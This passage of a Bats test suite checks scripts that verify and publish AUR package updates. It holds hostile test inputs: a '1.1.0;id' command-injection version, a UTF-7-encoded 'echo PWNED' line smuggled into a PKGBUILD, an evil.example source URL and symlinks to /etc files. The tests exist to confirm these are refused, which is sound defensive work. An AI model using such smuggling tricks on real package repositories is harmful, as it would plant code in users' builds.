  [ "$(pkg_get "$TEST_TMPDIR/packages/demo.yml" 'has("current_asset")')" = "false" ]
}

@test "publish-pkg: clones the AUR repo without a checkout and keeps its other files" {
  setup_publish
  aur_add_file demo.install "post_install() { :; }"
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 1.1.0 "$PREPARED"
  [ "$status" -eq 0 ]
  grep -qx -- '--no-checkout' "$TEST_TMPDIR/clone-opts"
  git -C "$AUR_REMOTE" show HEAD:PKGBUILD | grep -qx 'pkgver=1.1.0'
  [ "$(git -C "$AUR_REMOTE" show HEAD:demo.install)" = "post_install() { :; }" ]
  [ "$(git -C "$AUR_REMOTE" ls-tree --name-only HEAD | LC_ALL=C sort | tr '\n' ' ')" = ".SRCINFO PKGBUILD demo.install " ]
}

# git add would convert both files on their way into the index: UTF-7
# turns +AAo- in a comment into a new line, ident collapses $Id: ...$
@test "publish-pkg: commits the prepared bytes whatever the attributes of the AUR repo say" {
  setup_publish
  write_pkgbuild "$PREPARED/PKGBUILD" 1.1.0 1 "sha256sums=('$H3' # +AAo-)+AAo-echo PWNED+AAo-x=(
            '$H4')"
  sed -i 's/^\tpkgdesc = demo$/&, $Id: kept $/' "$TEST_TMPDIR/old.SRCINFO" "$PREPARED/.SRCINFO"
  aur_add_file .SRCINFO "$(<"$TEST_TMPDIR/old.SRCINFO")"
  aur_add_file .gitattributes $'PKGBUILD working-tree-encoding=UTF-7\n.SRCINFO ident'

  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 1.1.0 "$PREPARED"
  [ "$status" -eq 0 ]
  cmp <(git -C "$AUR_REMOTE" cat-file blob HEAD:PKGBUILD) "$PREPARED/PKGBUILD"
  cmp <(git -C "$AUR_REMOTE" cat-file blob HEAD:.SRCINFO) "$PREPARED/.SRCINFO"
}

@test "publish-pkg: refuses a prepared PKGBUILD that changes other lines" {
  setup_publish
  sed -i 's|https://example.com/demo|https://evil.example/demo|' "$PREPARED/PKGBUILD"
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 1.1.0 "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD changes lines outside pkgver, pkgrel and checksums"* ]]
  [ "$(git -C "$AUR_REMOTE" rev-parse HEAD)" = "$AUR_BASE" ]
  [ "$(pkg_get "$TEST_TMPDIR/packages/demo.yml" .current)" = "1.0.0" ]
}

@test "publish-pkg: refuses a prepared file that is a symlink" {
  setup_publish
  mv "$PREPARED/PKGBUILD" "$TEST_TMPDIR/real.PKGBUILD"
  ln -s "$TEST_TMPDIR/real.PKGBUILD" "$PREPARED/PKGBUILD"
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 1.1.0 "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"regular file"* ]]
  [ "$(git -C "$AUR_REMOTE" rev-parse HEAD)" = "$AUR_BASE" ]
}

@test "publish-pkg: refuses a prepared directory that is a symlink" {
  setup_publish
  mv "$PREPARED" "$TEST_TMPDIR/real-prepared"
  ln -s "$TEST_TMPDIR/real-prepared" "$PREPARED"
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 1.1.0 "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared directory is missing or a symlink"* ]]
  [ "$(git -C "$AUR_REMOTE" rev-parse HEAD)" = "$AUR_BASE" ]
}

@test "publish-pkg: refuses an AUR repo whose PKGBUILD is a symlink" {
  setup_publish
  local work="$TEST_TMPDIR/aur-work-demo"
  cp "$OLD" "$TEST_TMPDIR/outside.PKGBUILD"
  git -C "$work" rm -q PKGBUILD
  ln -s "$TEST_TMPDIR/outside.PKGBUILD" "$work/PKGBUILD"
  git -C "$work" add PKGBUILD
  git -C "$work" -c user.name=aur -c user.email=aur@example.invalid \
    -c commit.gpgsign=false commit -qm "symlink"
  git -C "$work" push -q "$AUR_REMOTE" master
  git -C "$AUR_REMOTE" rev-parse HEAD >"$PREPARED/base"

  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 1.1.0 "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"symlink"* ]]
  cmp "$OLD" "$TEST_TMPDIR/outside.PKGBUILD"
}

@test "publish-pkg: refuses an unsafe version before any git call" {
  setup_publish
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo '1.1.0;id' "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Version string rejected, only A-Za-z0-9 . _ + are allowed: '1.1.0;id'"* ]]
  [ ! -f "$TEST_TMPDIR/clone-urls" ]
}

@test "publish-pkg: defers when the AUR moved since the update was prepared" {
  setup_publish
  printf '0%.0s' {1..40} >"$PREPARED/base"
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 1.1.0 "$PREPARED"
  [ "$status" -eq 3 ]
  [ "$(git -C "$AUR_REMOTE" rev-parse HEAD)" = "$AUR_BASE" ]
}

@test "publish-pkg: refuses an update prepared for another version" {
  setup_publish
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 1.2.0 "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"pkgver=1.1.0, expected 1.2.0"* ]]
  [ "$(git -C "$AUR_REMOTE" rev-parse HEAD)" = "$AUR_BASE" ]
}

@test "publish-pkg: syncs the YAML when the AUR already has the version" {
  create_test_package "demo" "github-release" "upstream:
  project: owner/repo
current: '0.9.0'"
  write_pkgbuild "$OLD" 1.0.0 1 "sha256sums=('$H1' '$H2')"
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 1 "$H1" "$H2"
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  PREPARED="$TEST_TMPDIR/out/demo"
  mkdir -p "$PREPARED"
  cp "$OLD" "$PREPARED/PKGBUILD"
  cp "$TEST_TMPDIR/old.SRCINFO" "$PREPARED/.SRCINFO"
  echo "$AUR_BASE" >"$PREPARED/base"

  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 1.0.0 "$PREPARED"
  [ "$status" -eq 2 ]
  [ "$(git -C "$AUR_REMOTE" rev-parse HEAD)" = "$AUR_BASE" ]
  [ "$(pkg_get "$TEST_TMPDIR/packages/demo.yml" .current)" = "1.0.0" ]
}

@test "publish-pkg: --dry-run pushes nothing" {
  setup_publish
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 1.1.0 "$PREPARED" --dry-run
  [ "$status" -eq 0 ]
  [ "$(git -C "$AUR_REMOTE" rev-parse HEAD)" = "$AUR_BASE" ]
  [ "$(pkg_get "$TEST_TMPDIR/packages/demo.yml" .current)" = "1.0.0" ]
}

# === verify-pkg.sh ===

# Helper: a curl that logs its arguments to curl.args and writes
# "source of <url>" to its -o file. While $TEST_TMPDIR/curl.fail exists it
# fails as curl -f does on an HTTP error.
mock_downloads() {
  cat >"$MOCK_DIR/curl" <<EOF
#!/usr/bin/env bash
echo "\$*" >>"$TEST_TMPDIR/curl.args"
[[ -e "$TEST_TMPDIR/curl.fail" ]] && exit 22
out=""
while [[ \$# -gt 1 ]]; do
  [[ "\$1" == "-o" ]] && out="\$2"
  shift
done
echo "source of \$1" >"\$out"
EOF
  chmod +x "$MOCK_DIR/curl"
}

# Helper: the AUR at 1.0.0 with local.patch, and a prepared 1.1.0 in
# $TEST_TMPDIR/out/demo whose checksums, SUM_REMOTE and SUM_LOCAL, match
# the sources
# Usage: setup_verify [site that replaces https://example.com]
setup_verify() {
  local site="${1:-https://example.com}"
  create_test_package "demo" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  echo "local patch" >"$TEST_TMPDIR/local.patch"
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$H1" "$H2"
  sed -i "s|https://example.com|$site|" "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/local.patch"
  mock_downloads
  SUM_REMOTE=$(printf 'source of %s\n' "$site/demo-1.1.0.tar.gz" | sha256sum | cut -d' ' -f1)
  SUM_LOCAL=$(sha256sum <"$TEST_TMPDIR/local.patch" | cut -d' ' -f1)
  PREPARED="$TEST_TMPDIR/out/demo"
  mkdir -p "$PREPARED"
  write_pkgbuild "$PREPARED/PKGBUILD" 1.1.0 1 "sha256sums=('$SUM_REMOTE' '$SUM_LOCAL')"
  write_srcinfo "$PREPARED/.SRCINFO" 1.1.0 1 "$SUM_REMOTE" "$SUM_LOCAL"
  sed -i "s|https://example.com|$site|" "$PREPARED/PKGBUILD" "$PREPARED/.SRCINFO"
  echo "$AUR_BASE" >"$PREPARED/base"
}

# Helper: commit the work tree of the AUR repo of demo as its new state and
# prepare the update from that commit
commit_aur_state() {
  local work="$TEST_TMPDIR/aur-work-demo"
  git -C "$work" add -A
  git -C "$work" -c user.name=aur -c user.email=aur@example.invalid \
    -c commit.gpgsign=false commit -qm "$1"
  git -C "$work" push -q "$AUR_REMOTE" master
  git -C "$AUR_REMOTE" rev-parse HEAD >"$PREPARED/base"
}

@test "verify-pkg: clones the AUR repo without a checkout" {
  setup_verify
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 0 ]
  grep -qx -- '--no-checkout' "$TEST_TMPDIR/clone-opts"
}

@test "verify-pkg: accepts checksums that match the sources" {
  setup_verify
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 0 ]
  grep -qx 'https://aur.archlinux.org/demo.git' "$TEST_TMPDIR/clone-urls"
  grep -q -- '--proto =http,https,ftp --proto-redir =http,https,ftp .* https://example.com/demo-1.1.0.tar.gz$' "$TEST_TMPDIR/curl.args"
}

# makepkg runs curl with -b "", so a cookie set on a redirect goes with the
# next request
@test "verify-pkg: downloads with the cookie engine on, as makepkg does" {
  setup_verify
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 0 ]
  grep -qF -- ' -b  --retry 3 ' "$TEST_TMPDIR/curl.args"
}

@test "verify-pkg: refuses a checksum that does not match the download" {
  setup_verify
  write_pkgbuild "$PREPARED/PKGBUILD" 1.1.0 1 "sha256sums=('$H3' '$SUM_LOCAL')"
  write_srcinfo "$PREPARED/.SRCINFO" 1.1.0 1 "$H3" "$SUM_LOCAL"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"demo-1.1.0.tar.gz"* ]]
}

@test "verify-pkg: refuses a wrong checksum of a local source" {
  setup_verify
  write_pkgbuild "$PREPARED/PKGBUILD" 1.1.0 1 "sha256sums=('$SUM_REMOTE' '$H4')"
  write_srcinfo "$PREPARED/.SRCINFO" 1.1.0 1 "$SUM_REMOTE" "$H4"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"local.patch"* ]]
}

@test "verify-pkg: refuses PKGBUILD checksums that differ from the .SRCINFO" {
  setup_verify
  write_pkgbuild "$PREPARED/PKGBUILD" 1.1.0 1 "sha256sums=('$H3' '$H4')"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"differ in sha256sums"* ]]
}

@test "verify-pkg: refuses a source it cannot download" {
  setup_verify
  touch "$TEST_TMPDIR/curl.fail"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Could not download"* ]]
}

@test "verify-pkg: refuses a local source that is a symlink in the AUR repo" {
  setup_verify
  ln -sf /etc/hostname "$TEST_TMPDIR/aur-work-demo/local.patch"
  commit_aur_state "local.patch as a symlink"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Source local.patch is a symlink or not a regular file in the AUR repo"* ]]
}

# aur_export writes a symlink as one to /nonexistent; this one leads to a
# regular file
@test "_source_file: refuses a local source that links to a regular file" {
  mkdir "$TEST_TMPDIR/aur" "$TEST_TMPDIR/downloads"
  echo "patch" >"$TEST_TMPDIR/real.patch"
  ln -s "$TEST_TMPDIR/real.patch" "$TEST_TMPDIR/aur/local.patch"
  run _source_file local.patch "$TEST_TMPDIR/aur" "$TEST_TMPDIR/downloads"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Source local.patch is a symlink or not a regular file in the AUR repo"* ]]
}

@test "verify-pkg: refuses a checksum of a source it does not download" {
  setup_verify "file:///etc"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Cannot check the checksum of file:"* ]]
  [ ! -e "$TEST_TMPDIR/curl.args" ]
}

@test "verify-pkg: skips a source with SKIP" {
  setup_verify
  local work="$TEST_TMPDIR/aur-work-demo"
  write_pkgbuild "$work/PKGBUILD" 1.0.0 2 "sha256sums=('SKIP' '$H2')"
  write_srcinfo "$work/.SRCINFO" 1.0.0 2 SKIP "$H2"
  commit_aur_state "skip"
  write_pkgbuild "$PREPARED/PKGBUILD" 1.1.0 1 "sha256sums=('SKIP' '$SUM_LOCAL')"
  write_srcinfo "$PREPARED/.SRCINFO" 1.1.0 1 SKIP "$SUM_LOCAL"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/curl.args" ]
}

@test "verify-pkg: finds a local source by the name before ::" {
  setup_verify
  local work="$TEST_TMPDIR/aur-work-demo"
  sed -i 's/"local.patch"/"local.patch::upstream.patch"/' "$work/PKGBUILD" "$PREPARED/PKGBUILD"
  sed -i 's/= local.patch$/= local.patch::upstream.patch/' "$work/.SRCINFO" "$PREPARED/.SRCINFO"
  commit_aur_state "renamed source"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 0 ]
}

@test "verify-pkg: refuses a local source missing from the AUR repo" {
  setup_verify
  git -C "$TEST_TMPDIR/aur-work-demo" rm -q local.patch
  commit_aur_state "no patch"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Local source local.patch is missing"* ]]
}

@test "verify-pkg: refuses a checksum of a source from Launchpad" {
  setup_verify
  local work="$TEST_TMPDIR/aur-work-demo"
  sed -i 's/"local.patch"/"lp:demo"/' "$work/PKGBUILD" "$PREPARED/PKGBUILD"
  sed -i 's/= local.patch$/= lp:demo/' "$work/.SRCINFO" "$PREPARED/.SRCINFO"
  commit_aur_state "bzr source"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Cannot check the checksum of lp:demo"* ]]
}

@test "verify-pkg: takes a file next to the PKGBUILD over a download of the same name" {
  setup_verify
  echo "committed archive" >"$TEST_TMPDIR/aur-work-demo/demo-1.1.0.tar.gz"
  commit_aur_state "archive in the repo"
  local sum
  sum=$(sha256sum <"$TEST_TMPDIR/aur-work-demo/demo-1.1.0.tar.gz" | cut -d' ' -f1)
  write_pkgbuild "$PREPARED/PKGBUILD" 1.1.0 1 "sha256sums=('$sum' '$SUM_LOCAL')"
  write_srcinfo "$PREPARED/.SRCINFO" 1.1.0 1 "$sum" "$SUM_LOCAL"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/curl.args" ]
}

@test "verify-pkg: refuses a source that is a symlink in the AUR repo" {
  setup_verify
  local work="$TEST_TMPDIR/aur-work-demo"
  git -C "$work" rm -q local.patch
  ln -s /etc/hostname "$work/local.patch"
  commit_aur_state "symlink"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"symlink"* ]]
}

# Helper: commit everything in a repo at a fixed date and tag the commit
# Usage: tag_upstream <repo> <tag> <date>
tag_upstream() {
  git -C "$1" add .
  GIT_AUTHOR_DATE="$3" GIT_COMMITTER_DATE="$3" git -C "$1" \
    -c user.name=up -c user.email=up@example.invalid -c commit.gpgsign=false \
    commit -qm "$2"
  git -C "$1" -c tag.gpgSign=false tag "$2"
}

# Helper: a repo standing in for the upstream git repo of demo, with tags
# v1.0.0 and v1.1.0 at fixed dates, so that their archives are fixed too.
# Its .gitattributes keeps ignored.txt out of git archive, unless the
# attributes are turned off as makepkg does. GIT_SUM is what makepkg -g
# prints for sha256sums of v1.1.0.
make_upstream() {
  local work="$TEST_TMPDIR/upstream-work"
  git init -q -b main "$work"
  printf 'demo\n' >"$work/README"
  printf 'kept by makepkg\n' >"$work/ignored.txt"
  printf 'ignored.txt export-ignore\n' >"$work/.gitattributes"
  tag_upstream "$work" v1.0.0 2026-01-01T00:00:00Z
  printf '1.1.0\n' >"$work/VERSION"
  tag_upstream "$work" v1.1.0 2026-01-02T00:00:00Z
  git clone -q --bare "$work" "$TEST_TMPDIR/upstream.git"
  GIT_SUM=3c22f642ed922d2407075abedb6b06a9e1a4d0813d9bfaff6c0acfc30a419e32
  GIT_COMMIT=25463c6b9d6d29b0aafce9086418e06b77292dff
}

# Helper: put a source in place of the remote archive of setup_verify, in
# the AUR repo and in the prepared files. VER stands for the version.
# Usage: use_source <source>
use_source() {
  local work="$TEST_TMPDIR/aur-work-demo" pkgver='${pkgver}'
  sed -i "s|https://example.com/demo-[^\"]*\.tar\.gz|${1//VER/$pkgver}|" "$work/PKGBUILD" "$PREPARED/PKGBUILD"
  sed -i "s|= https://example.com/demo-1.0.0.tar.gz\$|= ${1//VER/1.0.0}|" "$work/.SRCINFO"
  sed -i "s|= https://example.com/demo-1.1.0.tar.gz\$|= ${1//VER/1.1.0}|" "$PREPARED/.SRCINFO"
  commit_aur_state "source $1"
}

@test "verify-pkg: checks a git source at a tag as makepkg does" {
  setup_verify
  make_upstream
  use_source "demo::git+https://example.com/demo.git#tag=vVER"
  sed -i "s/$SUM_REMOTE/$GIT_SUM/" "$PREPARED/PKGBUILD" "$PREPARED/.SRCINFO"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 0 ]
  grep -qx 'https://example.com/demo.git' "$TEST_TMPDIR/git-clone-urls"
}

@test "verify-pkg: checks a git source at a commit as makepkg does" {
  setup_verify
  make_upstream
  use_source "git+https://example.com/demo.git#commit=$GIT_COMMIT"
  sed -i "s/$SUM_REMOTE/$GIT_SUM/" "$PREPARED/PKGBUILD" "$PREPARED/.SRCINFO"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 0 ]
}

@test "verify-pkg: refuses a wrong checksum of a git source" {
  setup_verify
  make_upstream
  use_source "demo::git+https://example.com/demo.git#tag=vVER"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"demo.git#tag=v1.1.0"* ]]
}

@test "verify-pkg: refuses a git source it cannot clone" {
  setup_verify
  # No make_upstream, so the mirror clone finds no repository
  use_source "demo::git+https://example.com/demo.git#tag=vVER"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Could not clone https://example.com/demo.git"* ]]
}

@test "verify-pkg: refuses a git tag the repository does not have" {
  setup_verify
  make_upstream
  use_source "demo::git+https://example.com/demo.git#tag=releaseVER"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Could not archive release1.1.0 of https://example.com/demo.git"* ]]
}

@test "verify-pkg: refuses a checksum of a git source at a branch" {
  setup_verify
  make_upstream
  use_source "demo::git+https://example.com/demo.git#branch=main"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"tag or commit"* ]]
  [ ! -e "$TEST_TMPDIR/git-clone-urls" ]
}

@test "verify-pkg: refuses a git source over a protocol other than https or http" {
  setup_verify
  make_upstream
  use_source "demo::git+ssh://example.com/demo.git#tag=vVER"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"git sources are cloned over https or http only"* ]]
  [ ! -e "$TEST_TMPDIR/git-clone-urls" ]
}

@test "verify-pkg: refuses a git tag that git would read as an option" {
  setup_verify
  make_upstream
  use_source "demo::git+https://example.com/demo.git#tag=-vVER"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"tag=-v1.1.0: makepkg hashes a git source only at a tag or commit"* ]]
  [ ! -e "$TEST_TMPDIR/git-clone-urls" ]
}

@test "verify-pkg: refuses a git source whose name a file in the AUR repo takes" {
  setup_verify
  make_upstream
  echo "not a repo" >"$TEST_TMPDIR/aur-work-demo/demo"
  use_source "demo::git+https://example.com/demo.git#tag=vVER"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"takes the place of the clone"* ]]
}

# makepkg clones a git source into a directory of that name
@test "_git_source_sum: refuses a git source without a usable name" {
  local entry
  for entry in "::git+https://example.com/demo.git#tag=v1" ".::git+https://example.com/demo.git#tag=v1" \
    "..::git+https://example.com/demo.git#tag=v1" "a/b::git+https://example.com/demo.git#tag=v1"; do
    run _git_source_sum "$entry" sha256 "$TEST_TMPDIR" "$TEST_TMPDIR"
    [ "$status" -eq 1 ]
    [[ "$output" == *"Cannot check the checksum of $entry" ]]
  done
}

@test "verify-pkg: refuses a .SRCINFO checksum array the PKGBUILD does not have" {
  setup_verify
  local work="$TEST_TMPDIR/aur-work-demo"
  sed -i "s/^\tlicense = MIT\$/&\n\tb2sums = $H1/" "$work/.SRCINFO"
  sed -i "s/^\tlicense = MIT\$/&\n\tb2sums = $H3/" "$PREPARED/.SRCINFO"
  commit_aur_state "b2sums"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"lists b2sums, the PKGBUILD does not"* ]]
}

@test "verify-pkg: refuses more checksums than sources" {
  setup_verify
  local work="$TEST_TMPDIR/aur-work-demo"
  write_pkgbuild "$work/PKGBUILD" 1.0.0 2 "sha256sums=('$H1' '$H2' '$H1')"
  sed -i "s/^\tsha256sums = $H2\$/&\n\tsha256sums = $H1/" "$work/.SRCINFO"
  commit_aur_state "three checksums"
  write_pkgbuild "$PREPARED/PKGBUILD" 1.1.0 1 "sha256sums=('$SUM_REMOTE' '$SUM_LOCAL' '$H3')"
  sed -i "s/^\tsha256sums = $SUM_LOCAL\$/&\n\tsha256sums = $H3/" "$PREPARED/.SRCINFO"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"has 3 sha256sums for 2 sources"* ]]
}

@test "verify-pkg: refuses a base that is not a commit id" {
  setup_verify
  echo master >"$PREPARED/base"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"not a commit id"* ]]
  [ ! -e "$TEST_TMPDIR/clone-urls" ]
}

@test "verify-pkg: refuses a prepared PKGBUILD that changes other lines, before any download" {
  setup_verify
  sed -i 's|https://example.com/demo|https://evil.example/demo|' "$PREPARED/PKGBUILD" "$PREPARED/.SRCINFO"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"changes lines outside"* ]]
  [ ! -e "$TEST_TMPDIR/curl.args" ]
}

@test "verify-pkg: defers when the AUR moved since the update was prepared" {
  setup_verify
  printf '0%.0s' {1..40} >"$PREPARED/base"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 3 ]
}

@test "verify-pkg: refuses a prepared directory that is a symlink" {
  setup_verify
  mv "$PREPARED" "$TEST_TMPDIR/real-prepared"
  ln -s "$TEST_TMPDIR/real-prepared" "$PREPARED"
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$PREPARED"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared directory is missing or a symlink"* ]]
  [ ! -e "$TEST_TMPDIR/clone-urls" ]
}

# === check-all.sh --prepare and --publish ===

# Helper: replace a script with a stub that logs its arguments to
# $TEST_TMPDIR/<script>.args and exits with the given code
# Usage: stub_script <script name> <exit code> [stderr text]
stub_script() {
  rm -f "$TEST_TMPDIR/scripts/$1"
  cat >"$TEST_TMPDIR/scripts/$1" <<EOF
#!/usr/bin/env bash
echo "\$*" >>"$TEST_TMPDIR/$1.args"
[[ -n "${3:-}" ]] && echo "${3:-}" >&2
exit $2
EOF
  chmod +x "$TEST_TMPDIR/scripts/$1"
}

@test "check-all --prepare: prepares the versions the check run found and hands over the statuses" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  create_test_package "older" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'
allow_downgrade: true"
  echo "new_version: 2.1.0" >"$TEST_TMPDIR/.status/pkg"
  echo "available_downgrade: 0.9.0" >"$TEST_TMPDIR/.status/older"
  stub_script check-update.sh 1 "strategy ran"
  stub_script update-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/check-update.sh.args" ]
  grep -qx "pkg 2.1.0 --prepare $TEST_TMPDIR/out/prepared" "$TEST_TMPDIR/update-pkg.sh.args"
  grep -qx "older 0.9.0 --prepare $TEST_TMPDIR/out/prepared" "$TEST_TMPDIR/update-pkg.sh.args"
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "new_version: 2.1.0" ]
  [ "$(cat "$TEST_TMPDIR/out/status/pkg")" = "new_version: 2.1.0" ]
  [ "$(cat "$TEST_TMPDIR/out/status/older")" = "available_downgrade: 0.9.0" ]
  [ "$(cat "$TEST_TMPDIR/out/status/_error_count")" = "0" ]
}

@test "check-all --prepare: keeps the other statuses of the check run" {
  create_test_package "fine" "github-release" "upstream:
  project: owner/repo
current: '2.0.0'"
  create_test_package "broken" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  create_test_package "unchecked" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  echo "up_to_date" >"$TEST_TMPDIR/.status/fine"
  echo "check_failed: API down" >"$TEST_TMPDIR/.status/broken"
  stub_script update-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/update-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/out/status/fine")" = "up_to_date" ]
  [ "$(cat "$TEST_TMPDIR/out/status/broken")" = "check_failed: API down" ]
  [ "$(cat "$TEST_TMPDIR/out/status/unchecked")" = "check_failed: not checked before --prepare" ]
  [ "$(cat "$TEST_TMPDIR/out/status/_error_count")" = "2" ]
}

@test "check-all --prepare: prepares no downgrade the check run skipped" {
  create_test_package "older" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  echo "downgrade_skipped: 0.9.0" >"$TEST_TMPDIR/.status/older"
  stub_script update-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/update-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/out/status/older")" = "downgrade_skipped: 0.9.0" ]
  [ "$(cat "$TEST_TMPDIR/out/status/_error_count")" = "0" ]
}

@test "check-all --prepare: prepares no version jump the check run skipped" {
  create_test_package "jumpy" "github-release" "upstream:
  project: owner/repo
current: '13'"
  echo "jump_skipped: 2026102100" >"$TEST_TMPDIR/.status/jumpy"
  stub_script update-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/update-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/out/status/jumpy")" = "jump_skipped: 2026102100" ]
  [ "$(cat "$TEST_TMPDIR/out/status/_error_count")" = "0" ]
}

@test "check-all --prepare: prepares no update the check run held" {
  create_test_package "held" "github-release" "upstream:
  project: owner/repo
current: 28+25
alerts:
  - when: major
    hold: true
    note: Raise makedepends java-environment to 28"
  echo "held: 29+1" >"$TEST_TMPDIR/.status/held"
  stub_script update-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/update-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/out/status/held")" = "held: 29+1" ]
  [ "$(cat "$TEST_TMPDIR/out/status/_error_count")" = "0" ]
}

@test "check-all --prepare: records a failed preparation" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  echo "new_version: 2.0.0" >"$TEST_TMPDIR/.status/pkg"
  stub_script update-pkg.sh 1 "audit failed"
  run "$TEST_TMPDIR/scripts/check-all.sh" --prepare "$TEST_TMPDIR/out"
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "update_failed: audit failed" ]
}

# Helper: write the status that the check job hands over for a package
